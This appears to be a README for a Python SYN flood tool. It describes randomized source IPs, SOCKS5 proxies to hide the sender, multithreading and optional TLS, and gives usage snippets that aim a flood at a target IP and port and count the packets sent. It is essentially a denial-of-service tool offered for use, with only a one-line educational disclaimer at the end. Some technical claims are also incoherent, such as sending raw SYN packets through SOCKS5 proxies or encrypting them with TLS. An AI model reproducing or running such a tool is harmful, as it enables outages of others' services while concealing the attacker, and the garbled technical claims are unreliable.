
This tool is designed to perform a SYN flood attack on a specified target IP and port. It utilizes randomized source IP addresses, proxy servers, and optional TLS encryption to enhance its effectiveness. The tool also includes rate limiting to control the attack intensity.

## Features
- **SYN Flood Attack**: Generates and sends SYN packets to the target.
- **Proxy Support**: Uses SOCKS5 proxies to obfuscate the source IP.
- **Rate Limiting**: Ensures controlled request rates.
- **TLS Support**: Optionally encrypts packets using SSL/TLS.
- **Logging**: Records sent packets for tracking.
- **Multi-threading**: Allows concurrent execution for efficiency.
- **Proxy Validation**: Checks for working proxies before use.

## Dependencies
- Python 3
- `argparse`
- `random`
- `socket`
- `logging`
- `ssl`
- `os`
- `requests`
- `scapy`
- `threading`
- `concurrent.futures`
- `socks`

## Usage
### 1. Loading Proxies
The tool can load proxies from a file. Proxies should be formatted as one per line.
```python
proxies = load_proxies_from_file("proxies.txt")
valid_proxies = filter_working_proxies(proxies)
```

### 2. Initializing the Attack
```python
syn_flooder = SYNFlood(target_ip="192.168.1.1", target_port=80, rate_limit=100, proxies=valid_proxies, use_tls=False)
syn_flooder.run_flood(packets_per_iteration=10)
```

### 3. Monitoring the Attack
```python
print(f"Packets sent: {syn_flooder.get_packet_count()}")
```

### 4. Enabling TLS Encryption
```python
syn_flooder.set_tls(True)
```

## Rate Limiter
The tool includes a rate limiter to prevent overwhelming a network.
```python
rate_limiter = RateLimiter(limit=100)
if rate_limiter.allow_request("192.168.1.1"):
    print("Request allowed")
```

## Proxy Handling
The tool integrates SOCKS5 proxies and validates them before use.
```python
proxy_list = load_proxies_from_file("proxies.txt")
valid_proxies = filter_working_proxies(proxy_list)
```

## Logging
Logs SYN packets sent with source and destination IPs.
```plaintext
2024-02-05 12:00:00 - INFO - SYN packet sent from 192.168.1.100 to 192.168.1.1:80
```

## Security Disclaimer
This tool is for educational and security research purposes only. Unauthorized use is illegal and unethical.

